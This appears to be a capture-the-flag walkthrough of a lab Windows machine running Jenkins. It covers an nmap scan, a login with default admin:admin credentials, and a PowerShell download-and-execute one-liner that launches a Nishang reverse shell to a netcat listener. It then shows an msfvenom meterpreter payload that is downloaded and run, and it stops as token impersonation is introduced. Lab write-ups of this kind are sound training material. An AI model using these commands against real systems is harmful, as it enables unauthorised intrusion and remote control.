We perform basic nmap scan to see open ports and version of the service that work on it.
nmap -sV -sC -Pn 10.10.230.14

Only 3 ports open on the machine:
80 - Microsft IIS httpd 7.5 and its just a webserver
3389 - Remote RDP
8080, and it's our Jenkins

Network maper found that's windows system.
I also started gobuster but no interesting directories found.


Ok, let's go then and see our victim port, 10.10.230.14:8080
On this port I find a page which only contain the image and Email alfred@wayneenterprises.com
I tried default credentials admin:admin and we are able to acess the backend 
It was defenitely 2 easy, now we are looking for a feature of the tool that allows you to execute commands on the underlying system, so we can upload our Nishang reverse shell.
We created the new project in Jenkins Go to new item -> EnterName and select Freestyle project -> Next -> Go into Build section select the Execute window batch command
Now we can perform almost every command on the system, we know its windows so we can upload our reverse shell via powershell
I created python HTTP server for this purpose, then pasted powershell command on site:
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

Before we do it we have to create our netcat listening session:
nc -lvnp <port>

Our session shoud be created, because our powershell command executed our script

To make the privilege escalation easier, let's switch to a meterpreter shell
I used msfvenom to create the a windows meterpreter reverse shell using the following payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o venom.exe

Then I created another python HTTP server to download our venom.exe via powershell commands, pasted it on victim machine:
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

Start venom.exe:
Start-Process "venom.exe"

Now that we have initial access, let's use token impersonation to gain system access.
Windows uses tokens to ensure that account have right privs to make some action that requires them. This is done by LSASS.exe
